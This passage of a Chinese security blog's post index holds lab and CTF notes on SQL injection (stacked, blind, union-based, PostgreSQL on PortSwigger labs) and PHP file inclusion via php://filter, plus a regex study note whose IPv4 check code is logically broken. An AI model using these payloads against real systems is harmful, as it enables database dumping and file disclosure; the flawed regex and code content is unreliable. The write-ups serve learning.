extractvalue(1,concat(&#x27;~&#x27;,(database()))))#<br></code></pre></td></tr></table></figure>\n\n<p>后面就是最简单的字符型注入步骤了，略</p>\n<p>注意这一关必须要先弱口令登录成功之后才可以进行这一步操作，</p>\n<p>不然会无法回显，可能不登陆成功需要盲注</p>\n<p>后面的pass8，9分别是referer注入，xff注入，</p>\n<p>构造语句完全一样</p>\n<h1 id=\"pass13-pass14\"><a href=\"#pass13-pass14\" class=\"headerlink\" title=\"pass13-pass14\"></a>pass13-pass14</h1><p>时间盲注</p>\n<p>界面的回显永远不会变，</p>\n<p>没有报错没有界面不同，</p>\n<p>前面的用不了了，</p>\n<p>因此就是时间盲注，</p>\n<p>主要payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">and if(length(database())=n,sleep(2),sleep(0))<br></code></pre></td></tr></table></figure>\n\n<p>if判断的第一个参数就是需要布尔盲注的语句了，</p>\n<p>结合上面的脚本改改就能过了，略</p>\n<p>pass14就是闭合变了，其他一样</p>\n","categories":["Web"],"tags":["sql"]},{"title":"正则表达式学习笔记","url":"/2023/06/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<h1 id=\"匹配零次或一次字符出现\"><a href=\"#匹配零次或一次字符出现\" class=\"headerlink\" title=\"? 匹配零次或一次字符出现\"></a>? 匹配零次或一次字符出现</h1><p>出现0次或者1次，可有可无</p>\n<p>例如我的表达式是这样的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">hello?world<br></code></pre></td></tr></table></figure>\n\n<p>那么可以匹配</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">helloworld<br>hellworld<br></code></pre></td></tr></table></figure>\n\n<p>两种字符串</p>\n<h1 id=\"匹配零次或多次字符出现\"><a href=\"#匹配零次或多次字符出现\" class=\"headerlink\" title=\"* 匹配零次或多次字符出现\"></a>* 匹配零次或多次字符出现</h1><p>匹配任意长度的字符，例如正则表达式是这样的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">oh*<br></code></pre></td></tr></table></figure>\n\n<p>那么就可以有以下n种字符可以匹配成功</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">oh<br>ohhhhhhhh   # (h的长度任意因此无限种字符可以被匹配)<br>o<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"匹配一次或多次字符出现\"><a href=\"#匹配一次或多次字符出现\" class=\"headerlink\" title=\"+ 匹配一次或多次字符出现\"></a>+ 匹配一次或多次字符出现</h1><p>匹配一次或多次字符出现，与上面“*”不同的是他不能匹配零次</p>\n<p>例如表达式是这样的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">oh+<br></code></pre></td></tr></table></figure>\n\n<p>那么可以匹配到的字符串是这样的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">ohhhhh<br>oh   <br>o   # 这个匹配不上，因为没有出现“h”<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"匹配指定字符出现次数\"><a href=\"#匹配指定字符出现次数\" class=\"headerlink\" title=\"{}  匹配指定字符出现次数\"></a>{}  匹配指定字符出现次数</h1><p>指定字符出现的次数，有如下三种格式</p>\n<ol>\n<li><p>oh{3}</p>\n<p>只用ohhh可以匹配到</p>\n</li>\n<li><p>oh{2,4}</p>\n<p>有3种方式可以匹配到，分别是长度为2，3，4的h</p>\n</li>\n<li><p>oh{3,}</p>\n<p>“h”出出出现三次及以上</p>\n</li>\n</ol>\n<h1 id=\"匹配多个字符\"><a href=\"#匹配多个字符\" class=\"headerlink\" title=\"()  匹配多个字符\"></a>()  匹配多个字符</h1><p>上面都是对单个字符进行的匹配，这个是匹配多个字符</p>\n<p>如果需要对多个字符进行匹配只需要个给需要多次匹配的字符加上一对小括号即可</p>\n<p>例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">regex: test(ab)*<br></code></pre></td></tr></table></figure>\n\n<p>就有如下n种可以匹配</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">testabab<br>test<br>testab<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"匹配其中一个字符\"><a href=\"#匹配其中一个字符\" class=\"headerlink\" title=\"|  匹配其中一个字符\"></a>|  匹配其中一个字符</h1><p>例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">a (cat|dog|bird)<br></code></pre></td></tr></table></figure>\n\n<p>就有三种可以匹配到，分别是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">a cat<br>a dog<br>a bird<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"匹配其中含有指定字符的字符\"><a href=\"#匹配其中含有指定字符的字符\" class=\"headerlink\" title=\"[] 匹配其中含有指定字符的字符\"></a>[] 匹配其中含有指定字符的字符</h1><p>听着很绕口，想起来也很费劲，但是看个例子就不迷糊了</p>\n\n\n<p>意思就是说：只要这个字符在括号内，那只要你出现在了我要匹配的字符里面，我就给你匹配上，不论顺序</p>\n<h1 id=\"指定字符匹配字符的范围\"><a href=\"#指定字符匹配字符的范围\" class=\"headerlink\" title=\"- 指定字符匹配字符的范围\"></a>- 指定字符匹配字符的范围</h1>\n\n<p>就是匹配所有的小写字母</p>\n<p>同样可以写：[a-zA-Z0-9]</p>\n<p>来匹配全部非符号字符</p>\n<h1 id=\"匹配除指定字符以外的所有字符\"><a href=\"#匹配除指定字符以外的所有字符\" class=\"headerlink\" title=\"^ 匹配除指定字符以外的所有字符\"></a>^ 匹配除指定字符以外的所有字符</h1>\n\n<p>正好与前面那个例子相反</p>\n<h1 id=\"元字符\"><a href=\"#元字符\" class=\"headerlink\" title=\"元字符\"></a>元字符</h1><ol>\n<li><p>\\d匹配全部数字字符</p>\n</li>\n<li><p>\\D除1↑外所有字符</p>\n</li>\n<li><p>\\w所有单词字符包括下划线、数字</p>\n</li>\n<li><p>\\W除3↑外所有字符</p>\n</li>\n<li><p>\\s代表所有空白符包括换行符，tab</p>\n</li>\n<li><p>\\S除5↑外所有字符</p>\n</li>\n<li><p>\\b匹配整行字符要求全部满足，有一个不满足则全部不匹配</p>\n<p>这一个有点难以理解，可以看后面的例子RGB</p>\n</li>\n</ol>\n<h1 id=\"匹配任意非换行字符\"><a href=\"#匹配任意非换行字符\" class=\"headerlink\" title=\".  匹配任意非换行字符\"></a>.  匹配任意非换行字符</h1><p>这个看标题就懂了吧，举1个拓展的例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">.*?  匹配全宇宙的字符<br>.*   匹配非宽字符全部字符（也差不多就是匹配全部字符毕竟键盘敲不出来宽字符）<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"特殊\"><a href=\"#特殊\" class=\"headerlink\" title=\"特殊\"></a>特殊</h1><p>^ 匹配行首 $ 匹配行尾</p>\n<h1 id=\"贪心模式与懒惰模式\"><a href=\"#贪心模式与懒惰模式\" class=\"headerlink\" title=\"贪心模式与懒惰模式\"></a>贪心模式与懒惰模式</h1><p>默认是贪心模式</p>\n<p>有如下一个字符串：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;span&gt;&lt;b&gt;testTesttesttesttesttesttest&lt;/b&gt;&lt;/span&gt;<br></code></pre></td></tr></table></figure>\n\n<p>我们想要匹配全部的标签，也就是说，匹配全部&lt;&gt;内的字符，</p>\n<p>但是是每个小的&lt;&gt;，如果你的正则是这个样子的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;.+&gt;<br></code></pre></td></tr></table></figure>\n\n<p>他就会匹配首尾两个&lt;&gt;，也就是说，他匹配了我们整个字符串，这就是贪心模式</p>\n<p>如果要切换为懒惰模式，就在+后面添加一个问号即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;.+?&gt;<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h1><h2 id=\"RGB颜色匹配\"><a href=\"#RGB颜色匹配\" class=\"headerlink\" title=\"RGB颜色匹配\"></a>RGB颜色匹配</h2><p>首先来寻找以下他的特点</p>\n<ol>\n<li>第一位永远为“#”</li>\n<li>“#”后面的字符一定是6位，且是a-fA-F0-9（hex）</li>\n</ol>\n<p>那么开始构造语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">#[a-fA-F0-9]&#123;6&#125;<br></code></pre></td></tr></table></figure>\n\n<p>测试成功，但是我们可以在最后添加一个\\b</p>\n<p>这样就不会在后面有垃圾字符了</p>\n\n\n<p>我愿将其理解为一个老鼠屎坏了一锅粥😁😁😁</p>\n<h2 id=\"IPV4地址匹配\"><a href=\"#IPV4地址匹配\" class=\"headerlink\" title=\"IPV4地址匹配\"></a>IPV4地址匹配</h2><p>ipv4的特征：</p>\n<ol>\n<li>一共4段</li>\n<li>每一段都是数字并且位于1~254之间</li>\n</ol>\n<p>于是开始构造语句：：：：：：：：我不会。</p>\n<p>但是谁没事用正则来匹配ipv4呢？用python不香吗？</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">ipv4</span>(<span class=\"hljs-params\">string</span>):<br>    string_list = string.split(<span class=\"hljs-string\">&#x27;.&#x27;</span>)<br>    <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> string_list:<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">int</span>(i) &gt;= <span class=\"hljs-number\">256</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-built_in\">int</span>(i) &lt; <span class=\"hljs-number\">0</span>:<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"拓展-邮箱匹配\"><a href=\"#拓展-邮箱匹配\" class=\"headerlink\" title=\"拓展-邮箱匹配\"></a>拓展-邮箱匹配</h2><p>浅浅拓展一个例子吧，首先来找一下邮箱的特征</p>\n<ol>\n<li>有一个“@”符号</li>\n<li>“@”后面必须有且只有一个“.”</li>\n<li>“.”后面的必须是网站域名后缀例如com、cn</li>\n</ol>\n<p>那么开始构造语句吧：：：：：：：：还是不会。</p>\n<p>放弃😡😡😡</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1>\n\n\n<blockquote>\n<p> <a href=\"https://www.bilibili.com/video/BV1da4y1p7iZ/?spm_id_from=333.337.search-card.all.click&vd_source=1c43bcf31e4abf33f3960dd414786c92\">10分钟快速掌握正则表达式</a></p>\n</blockquote>\n","categories":["Note"]},{"title":"攻防世界打靶随记","url":"/2023/07/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/","content":"<h1 id=\"1-Sql-inject\"><a href=\"#1-Sql-inject\" class=\"headerlink\" title=\"1 Sql-inject\"></a>1 Sql-inject</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://61.147.171.105:61115/?inject=1<br></code></pre></td></tr></table></figure>\n<p>判断闭合————&gt;单引号<br>构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">union select 1,2<br></code></pre></td></tr></table></figure>\n<p>发现被过滤了，界面返回：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);<br></code></pre></td></tr></table></figure>\n<p>就是说他的正则匹配到了我们的语句，<br>尝试大小写绕过，，失败<br>复写过滤字符绕过，，失败<br>但是他没有过滤我们的“show”啊！<br>这个payload是可用的,结合堆叠注入可以构造出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27;;show databases --+<br>&#x27;;show tables from supersqli --+<br>&#x27;;show columns from words --+<br></code></pre></td></tr></table></figure>\n<p>最后一段查内容不会无奈看了一下writeup</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #<br></code></pre></td></tr></table></figure>\n<p>也就是将这两个表换了个名字，<br>但是我们原来的查询语句是在1145141919180这个表里面查询的，<br>现在查询的还是这个名字的表，但是内容却是含有flag的那个表</p>\n<h1 id=\"2-Sql-inject2\"><a href=\"#2-Sql-inject2\" class=\"headerlink\" title=\"2 Sql-inject2\"></a>2 Sql-inject2</h1><p>这是一道post注入的题目，尝试万能密码失败，<br>抓包看到有个注释：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- use.php --&gt;</span><br></code></pre></td></tr></table></figure>\n<p>然后让他去访问那个原来的url<br>回显：nonono<br>被嘲讽了c<br>后面的内容似乎涉及到了ssrf我就不写了，去看write up吧</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/xulei1132562/article/details/126541635\">https://blog.csdn.net/xulei1132562/article/details/126541635</a></p>\n</blockquote>\n<h1 id=\"3-Sql-inject3\"><a href=\"#3-Sql-inject3\" class=\"headerlink\" title=\"3 Sql-inject3\"></a>3 Sql-inject3</h1><p>这是一道搜索型注入，判断是模糊匹配</p>\n\n\n<p>只需要使用%’#即可闭合，然后在bp里面构造语句之后发现存在布尔盲注</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">search=hello%&#x27; and length(database())&lt;=100000000# 有返回值<br>search=hello%&#x27; and length(database())&gt;=100000000# 无返回值<br></code></pre></td></tr></table></figure>\n\n<p>bp爆破数据库长度</p>\n\n\n<p>接着爆破数据库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">search=hello%&#x27; and ascii(substr(database(),1,1))=§qqq§#<br></code></pre></td></tr></table></figure>\n\n\n\n<p>最后爆破出来是news</p>\n\n\n<p>接着爆破表名长度，<strong>注意要用括号把length()里面的字符串括起来</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">hello%&#x27; and length((select group_concat(table_name) from information_schema.tables where table_schema=&quot;news&quot;))=17#<br></code></pre></td></tr></table></figure>\n\n<p>然后爆破表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">search=hello%&#x27; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),§2§,1))=§qqq§#<br></code></pre></td></tr></table></figure>\n\n\n\n<p>news,secret_table</p>\n<p>然后爆破列名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">hello%&#x27; and length((select group_concat(column_name) from information_schema.columns where table_schema=&quot;news&quot; and table_name=&#x27;secret_table&#x27;) )=7#<br></code></pre></td></tr></table></figure>\n\n\n\n<p>之后的就不记录了</p>\n<hr>\n<p>看了以下wt。。。。。原来是可以直接最普通的union注入的。。。。。。。</p>\n\n\n\n\n<h1 id=\"4-文件包含\"><a href=\"#4-文件包含\" class=\"headerlink\" title=\"4 文件包含\"></a>4 文件包含</h1><p>访问url，可以看到一些提示，绝对路径&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php，也提示了flag在flag.php中。</p>\n<p>快捷键Ctrl+u,查看网页源代码</p>\n<p>思路：</p>\n<p>源代码中看到<code>@include($lan.&quot;.php&quot;);</code>，可知此处存在文件包含</p>\n<p><code>$lan</code>的值是从cookie中传过来的。所以对<code>language</code>赋值，构造payload，重放包就可读出flag.php经过base64加密后字符串，base64解密后得到flag</p>\n<p>burp抓包</p>\n<p>Cookie: language&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag</p>\n<p>解密，得到flag</p>\n<p>补充：<br>php:&#x2F;&#x2F;filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。<br>例如读取文件：php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p>\n<p>读取上级目录文件：php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;…&#x2F;…&#x2F;…&#x2F;a.txt</p>\n<p>读取其他的文件：php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;F:\\b.txt</p>\n<h1 id=\"5-文件包含2\"><a href=\"#5-文件包含2\" class=\"headerlink\" title=\"5 文件包含2\"></a>5 文件包含2</h1><p>源代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">&quot;flag.php&quot;</span>);<br><span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;file1&quot;</span>]) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;file2&quot;</span>]))<br>&#123;<br>    <span class=\"hljs-variable\">$file1</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;file1&quot;</span>];<br>    <span class=\"hljs-variable\">$file2</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;file2&quot;</span>];<br>    <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">empty</span>(<span class=\"hljs-variable\">$file1</span>) &amp;&amp; !<span class=\"hljs-keyword\">empty</span>(<span class=\"hljs-variable\">$file2</span>))<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$file2</span>) === <span class=\"hljs-string\">&quot;hello ctf&quot;</span>)<br>        &#123;<br>            <span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$file1</span>);<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;NONONO&quot;</span>);<br>&#125; <br></code></pre></td></tr></table></figure>\n<p>file_get_contents函数可以使用php伪协议绕过</p>\n<p>Payload:<br>?file1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&amp;file2&#x3D;php:&#x2F;&#x2F;input<br>如果被过滤了可以尝试使用php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.Utf-7&#x2F;resource&#x3D;flag.php</p>\n<p>Post写入: hello ctf<br>（注意post写完bp里面不需要空两行）</p>\n<h1 id=\"6-文件包含3\"><a href=\"#6-文件包含3\" class=\"headerlink\" title=\"6 文件包含3\"></a>6 文件包含3</h1><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-title function_ invoke__\">show_source</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;hello&#x27;</span>];<br><span class=\"hljs-variable\">$page</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;page&#x27;</span>];<br><span class=\"hljs-keyword\">while</span> (<span class=\"hljs-title function_ invoke__\">strstr</span>(<span class=\"hljs-variable\">$page</span>, <span class=\"hljs-string\">&quot;php://&quot;</span>)) &#123;<br>    <span class=\"hljs-variable\">$page</span>=<span class=\"hljs-title function_ invoke__\">str_replace</span>(<span class=\"hljs-string\">&quot;php://&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>, <span class=\"hljs-variable\">$page</span>);<br>&#125;<br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$page</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>给出源代码，发现会过滤php:&#x2F;&#x2F;那么直接大小写绕过即可，但是找不到需要读取的文件，意识到应该是只有getshell或者有命令执行才能获取flag</p>\n<hr>\n\n\n<ul>\n<li>php:&#x2F;&#x2F;input的作用是获取post内的内容并执行</li>\n</ul>\n<h1 id=\"7-文件包含4\"><a href=\"#7-文件包含4\" class=\"headerlink\" title=\"7 文件包含4\"></a>7 文件包含4</h1><ol>\n<li>访问页面，查看源码</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;?php<br>highlight_file(__FILE__);<br>    include(&quot;./check.php&quot;);<br>    if(isset($_GET[&#x27;filename&#x27;]))&#123;<br>        $filename  = $_GET[&#x27;filename&#x27;];<br>        include($filename);<br>    &#125;<br>?&gt;<br></code></pre></td></tr></table></figure>\n\n<p>这里我们可以看出可以结合<code>php://filter</code>结合文件包含来读取文件</p>\n<ol>\n<li>使用base64读取</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://ip:port/index.php?filename=php://filter/read=convert.base64-encode/resource=/flag<br></code></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>使用 String Filters</li>\n</ol>\n<p>得到同样的 <code>do not hack!</code>的结果</p>\n<ol start=\"3\">\n<li>使用 Conversion Filters</li>\n</ol>\n<p>尝试使用以下过滤器，都不行</p>\n<ul>\n<li>convert.base64</li>\n<li>convert.quoted</li>\n</ul>\n<p>使用 <code>convert.iconv.[]</code>过滤器，<code>[]</code>中支持以下字符编码（* 表示该编码也可以在正则表达式中使用）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">UCS-4*<br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*<br>EUC-JP*<br>SJIS*<br>eucJP-win*<br>SJIS-win*<br>。。。。。。<br></code></pre></td></tr></table></figure>\n\n<p>分别进行尝试</p>\n<p>payload:<br> <code>http://127.0.0.1:32771/index.php?filename=php://filter//convert.iconv.UCS-4*/resource=/var/www/html/flag.php</code></p>\n<p>payload:<br> <code>http://127.0.0.1:32771/index.php?filename=php://filter//convert.iconv.UCS-4BE/resource=/var/www/html/flag.php</code></p>\n<p>payload:<br> <code>http://127.0.0.1:32771/index.php?filename=php://filter//convert.iconv.UCS-4LE*/resource=/var/www/html/flag.php</code></p>\n<p>…(依次尝试)</p>\n<p>最后可以发现，<code>UCS-4*</code>是没有报出错误信息的</p>\n<hr>\n<p>此题考验编码知识的掌握</p>\n<h1 id=\"8-文件上传\"><a href=\"#8-文件上传\" class=\"headerlink\" title=\"8 文件上传\"></a>8 文件上传</h1><p>文件上传，上传php，上传png等格式文件都是一片空白的返回，此时有个经验点，直接访问http(s):&#x2F;&#x2F;ip&#x2F;upload文件夹，可以看到我们上传的文件，只有图片保存了下来</p>\n\n\n<p>那就是出现了文件名后缀的过滤并且不给出返回值，此时可以尝试上传.htaccess来指定php解析。</p>\n<p>但是，重新访问后还是没有出现这个文件，猜测，只能上传图片后缀的文件。那么我们可以上传shell.png.php试试看，是不是有白名单，但是还是上传失败了。。。？？</p>\n<hr>\n<p>看了下writeup，原来是条件竞争上传</p>\n\n\n<p>然后再这样：</p>\n\n\n<p>这题好难</p>\n","categories":["Web"],"tags":["sql","file_upload","file_inclusion"]},{"title":"PortSwigger打靶随记","url":"/2023/07/11/PortSwigger%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/","content":"<p>这篇文章来打burp官方提供的portswigger的部分靶场</p>\n<span id=\"more\"></span>\n\n<h1 id=\"postgresql注入\"><a href=\"#postgresql注入\" class=\"headerlink\" title=\"postgresql注入\"></a>postgresql注入</h1><p>点进去是商品订购界面，随便点进去一个，查看url：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">https://0acd0080047e94b286d27aae00ca001f.web-security-academy.net/product?productId=7<br></code></pre></td></tr></table></figure>\n\n<p>注入不就来了吗？但是这里又遇到了一个问题—-&gt;判断不出闭合？</p>\n<p>单引号双引号 and 1&#x3D;1 and 1&#x3D;2 都是一个报错页面：<code>&quot;Invalid product ID&quot;</code></p>\n<p>难道注入的点不是在这里？回到主界面再试试看，发现还有一个category的参数传递的点</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">https://0acd0080047e94b286d27aae00ca001f.web-security-academy.net/filter?category=Accessories<br></code></pre></td></tr></table></figure>\n\n<p>尝试注入，，，成功测试出注入点！</p>\n<ol>\n<li><p>闭合 单引号</p>\n</li>\n<li><p>字段数：8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?category=Accessories&#x27; order by 8--+<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>尝试联合查询获取回显点，，失败，尝试报错注入，，还是失败，，尝试布尔盲注</p>\n<p>这个倒是成功了，有不同的页面</p>\n<p>但是布尔盲注过于麻烦，这里不记录了，这里尝试新的注入方法：sqlmap万能注入😏</p>\n<p class='item-img' data-src='/1.png'><img src=\"/1.png\"></p>\n</li>\n</ol>\n<p>原来是postgresql数据库类型，暂时退下sqlmap，看着上次梳理的文章实操一下吧</p>\n<p>注出回显点:</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?category=Accessories<span class=\"hljs-string\">&#x27; union all select null,null,null,null,null,null,null,null--+</span><br></code></pre></td></tr></table></figure>\n\n<p>然后判断每一位的数据类型，一位一位的替换：</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?category=Accessories<span class=\"hljs-string\">&#x27; union all select null,&#x27;</span>null1<span class=\"hljs-string\">&#x27;,&#x27;</span>null2<span class=\"hljs-string\">&#x27;,null,null,&#x27;</span>null3<span class=\"hljs-string\">&#x27;,null,&#x27;</span>null4<span class=\"hljs-string\">&#x27;--+</span><br></code></pre></td></tr></table></figure>\n\n<p>​\t界面的回显点是null2，然后我们获取数据库：</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?category=Accessories<span class=\"hljs-string\">&#x27; union all select null,&#x27;</span>null1<span class=\"hljs-string\">&#x27;,current_database(),null,null,&#x27;</span>null3<span class=\"hljs-string\">&#x27;,null,&#x27;</span>null4<span class=\"hljs-string\">&#x27; --+</span><br></code></pre></td></tr></table></figure>\n\n<p>得到当前数据库名是<code>academy_labs</code></p>\n<p>然后查表名：</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?category=Accessories<span class=\"hljs-string\">&#x27; union all select null,&#x27;</span>null1<span class=\"hljs-string\">&#x27;,tablename,null,null,&#x27;</span>null3<span class=\"hljs-string\">&#x27;,null,&#x27;</span>null4<span class=\"hljs-string\">&#x27; from pg_tables where schemaname=&#x27;</span><span class=\"hljs-built_in\">public</span><span class=\"hljs-string\">&#x27;--+</span><br></code></pre></td></tr></table></figure>\n\n<p>得到当前表名是<code>products</code>，然后获取列名：</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?category=Accessories<span class=\"hljs-string\">&#x27; union all select null,&#x27;</span>null1<span class=\"hljs-string\">&#x27;,column_name,null,null,&#x27;</span>null3<span class=\"hljs-string\">&#x27;,null,&#x27;</span>null4<span class=\"hljs-string\">&#x27; from information_schema.columns where table_schema=&#x27;</span><span class=\"hljs-built_in\">public</span><span class=\"hljs-string\">&#x27; and table_name=&#x27;</span>products<span class=\"hljs-string\">&#x27; --+</span><br></code></pre></td></tr></table></figure>\n\n<p>获取出了列名：</p>\n<p><code>id category name rating price image released description</code></p>\n<p>然后dump全部内容：</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?category=Accessories<span class=\"hljs-string\">&#x27; union all select null,&#x27;</span>null1<span class=\"hljs-string\">&#x27;,price||&#x27;</span>::<span class=\"hljs-string\">&#x27;||name,null,null,&#x27;</span>null3<span class=\"hljs-string\">&#x27;,null,&#x27;</span>null4<span class=\"hljs-string\">&#x27; from public.products--+</span><br></code></pre></td></tr></table></figure>\n\n<p>这里就只挑选两列的内容吧，成功dump全部：</p>\n<p class='item-img' data-src='/2.png'><img 